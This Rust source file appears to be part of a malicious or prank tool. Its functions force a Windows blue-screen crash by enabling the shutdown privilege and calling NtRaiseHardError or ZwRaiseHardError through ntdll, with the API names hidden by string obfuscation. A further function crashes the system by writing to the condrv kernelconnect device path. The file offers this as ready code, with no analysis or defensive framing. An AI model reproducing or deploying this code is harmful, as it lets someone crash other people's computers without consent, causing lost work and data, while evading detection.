use winapi::ctypes::c_ulong;
use winapi::shared::minwindef::{HMODULE, ULONG};
use winapi::shared::ntdef::{NTSTATUS, BOOLEAN};
use winapi::um::libloaderapi::{LoadLibraryA, GetProcAddress};
use std::ffi::CString;
use winreg::enums::HKEY_LOCAL_MACHINE;
use winreg::RegKey;
use winreg::enums::REG_PROCESS_APPKEY;
use anyhow::Result;

const SHUTDOWN_PRIVILEGE: ULONG = 19;
const OPTION_SHUTDOWN: ULONG = 6;

type RtlAdjustPrivilegeFn = unsafe extern "system" fn(
    privilege: ULONG,
    enable: BOOLEAN,
    current_thread: BOOLEAN,
    enabled: *mut BOOLEAN,
) -> NTSTATUS;

type NtRaiseHardErrorFn = unsafe extern "system" fn(
    error_status: NTSTATUS,
    number_of_parameters: ULONG,
    unicode_string_parameter_mask: ULONG,
    parameters: *mut c_ulong,
    response_option: ULONG,
    response: *mut ULONG,
) -> NTSTATUS;

type ZwRaiseHardErrorFn = unsafe extern "system" fn(
    error_status: NTSTATUS,
    number_of_parameters: ULONG,
    unicode_string_parameter_mask: ULONG,
    parameters: *mut c_ulong,
    response_option: ULONG,
    response: *mut ULONG,
) -> NTSTATUS;

pub fn nt_bsod() {
    unsafe {
        let ntdll: HMODULE = LoadLibraryA(CString::new(obfstr::obfstr!("ntdll.dll")).unwrap().as_ptr());

        let rtl_adjust_privilege: RtlAdjustPrivilegeFn = std::mem::transmute(GetProcAddress(
            ntdll,
            CString::new(obfstr::obfstr!("RtlAdjustPrivilege")).unwrap().as_ptr(),
        ));

        let mut enabled: BOOLEAN = 0;
        if rtl_adjust_privilege(SHUTDOWN_PRIVILEGE, 1, 0, &mut enabled) == 0 {
            let nt_raise_hard_error: NtRaiseHardErrorFn = std::mem::transmute(GetProcAddress(
                ntdll,
                CString::new(obfstr::obfstr!("NtRaiseHardError")).unwrap().as_ptr(),
            ));

            let mut response: ULONG = 0;
            nt_raise_hard_error(0xC0000002u32 as i32, 0, 0, std::ptr::null_mut(), OPTION_SHUTDOWN, &mut response);
        }
    }
}

pub fn zw_bsod() {
    unsafe {
        let ntdll: HMODULE = LoadLibraryA(CString::new(obfstr::obfstr!("ntdll.dll")).unwrap().as_ptr());

        let rtl_adjust_privilege: RtlAdjustPrivilegeFn = std::mem::transmute(GetProcAddress(
            ntdll,
            CString::new(obfstr::obfstr!("RtlAdjustPrivilege")).unwrap().as_ptr(),
        ));

        let mut enabled: BOOLEAN = 0;
        if rtl_adjust_privilege(SHUTDOWN_PRIVILEGE, 1, 0, &mut enabled) == 0 {
            let zw_raise_hard_error: ZwRaiseHardErrorFn = std::mem::transmute(GetProcAddress(
                ntdll,
                CString::new(obfstr::obfstr!("ZwRaiseHardError")).unwrap().as_ptr(),
            ));

            let mut response: ULONG = 0;
            zw_raise_hard_error(0xC0000002u32 as i32, 0, 0, std::ptr::null_mut(), OPTION_SHUTDOWN, &mut response);
        }
    }
}

// pub fn mount_hive(hive_path: &str) -> Result<()> {
//     let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
//     let subkey = r"System\CurrentControlSet\Control\hivelist";
//     let (key, _disposition) = hklm.create_subkey(subkey)?;

//     key.query_info()?;

//     Ok(())
// }

use std::fs::OpenOptions;
use std::io::Write;

pub fn reg_crash() {
    let path = r"\\.\globalroot\device\condrv\kernelconnect";
    let mut file = OpenOptions::new()
        .append(true)
        .open(path);

    file.unwrap().write_all(b" ").unwrap();
}

    